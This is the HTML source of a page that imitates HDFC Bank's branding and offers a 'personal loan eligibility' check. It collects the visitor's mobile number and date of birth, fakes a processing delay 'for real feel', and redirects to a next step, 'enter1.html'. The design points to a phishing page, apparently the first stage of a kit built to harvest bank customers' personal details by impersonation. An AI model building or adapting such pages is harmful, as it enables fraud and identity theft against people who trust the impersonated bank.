<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HDFC BANK - Personal Loan</title>
    <style>
        :root {
            /* Aapke HD logo se match karta hua Navy Blue color */
            --hdfc-navy: #03327d; 
            --hdfc-blue: #004c8f;
        }

        body { 
            font-family: 'Segoe UI', Roboto, sans-serif; 
            margin: 0; 
            padding: 0; 
            background-color: #fff; 
            color: #333;
        }

        /* 1. Header: Ab yahan koi white box nahi hai */
        .header-main {
            background-color: var(--hdfc-navy);
            padding: 12px 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        .logo-img {
            height: 30px; /* PC aur Mobile dono ke liye balanced size */
            width: auto;
            display: block;
            border: none;
            background: transparent; /* Box hatane ke liye */
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .help-btn {
            color: white;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        /* 2. Banner: Zero Gap aur No Cube */
        .loan-banner {
            width: 100%;
            line-height: 0;
            background-color: #eef7ff;
        }

        .banner-img {
            width: 100%;
            height: auto;
            display: block;
            border: none;
        }

        /* 3. Form Section */
        .form-container {
            padding: 25px 20px;
            max-width: 500px;
            margin: 0 auto;
        }

        h3 { 
            color: #031635; 
            font-size: 20px; 
            font-weight: 600; 
            margin-bottom: 25px; 
        }

        .input-group { margin-bottom: 22px; }
        label { display: block; font-size: 15px; color: #666; margin-bottom: 8px; font-weight: 500; }

        /* Rounded Mobile Box */
        .mobile-wrapper {
            display: flex;
            align-items: center;
            border: 1px solid #ccc;
            border-radius: 12px;
            padding: 14px 15px;
            background: #fff;
            transition: 0.3s;
        }

        .mobile-wrapper:focus-within {
            border-color: var(--hdfc-blue);
        }

        .mobile-wrapper img { width: 22px; margin-right: 10px; }
        .mobile-wrapper span { 
            font-size: 16px; 
            color: #444; 
            border-right: 1px solid #eee; 
            padding-right: 12px; 
            margin-right: 12px; 
        }
        
        input { 
            border: none; 
            outline: none; 
            font-size: 16px; 
            width: 100%; 
            background: transparent;
        }

        /* Submit Button */
        .btn-submit {
            background-color: var(--hdfc-blue);
            color: white;
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 10px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
            margin-top: 25px;
            box-shadow: 0 4px 12px rgba(0, 76, 143, 0.2);
        }

        footer { 
            text-align: center; 
            padding: 30px; 
            font-size: 12px; 
            color: #888; 
            background: #f9f9f9; 
            border-top: 1px solid #eee; 
            margin-top: 30px;
        }
    </style>
</head>
<body>

<div class="header-main">
    <img src="logo.png" alt="HDFC BANK" class="logo-img">
    <div class="header-right">
        <a href="#" class="help-btn">? Help</a>
    </div>
</div>

<div class="loan-banner">
    <img src="banner.png" alt="Personal Loan Offer" class="banner-img">
</div>

<div class="form-container">
    <h3>Welcome! Check your loan eligibility</h3>
    
    <div class="input-group">
        <label>Registered Mobile Number</label>
        <div class="mobile-wrapper">
            <img src="https://img.icons8.com/color/48/000000/india.png" alt="IN">
            <span>+91</span>
            <input type="number" id="mobile" placeholder="Enter Mobile Number" oninput="if(this.value.length>10)this.value=this.value.slice(0,10)">
        </div>
    </div>

    <div class="input-group">
        <label>Select Date of Birth</label>
        <div class="mobile-wrapper">
            <input type="date" id="dob">
        </div>
    </div>

    <button class="btn-submit" onclick="startLoading()">View Loan Offer</button>
</div>

<footer>
    © Copyright HDFC Bank Ltd. 2026. All rights reserved.
</footer>

<script>
    function startLoading() {
        const mobile = document.getElementById('mobile').value;
        if(mobile.length < 10) {
            alert("Kripya 10 digit ka mobile number daalein.");
            return;
        }
        // Button text change for real feel
        document.querySelector('.btn-submit').innerText = "Processing...";
        setTimeout(() => {
            window.location.href = "enter1.html";
        }, 2000);
    }
</script>

</body>
</html>
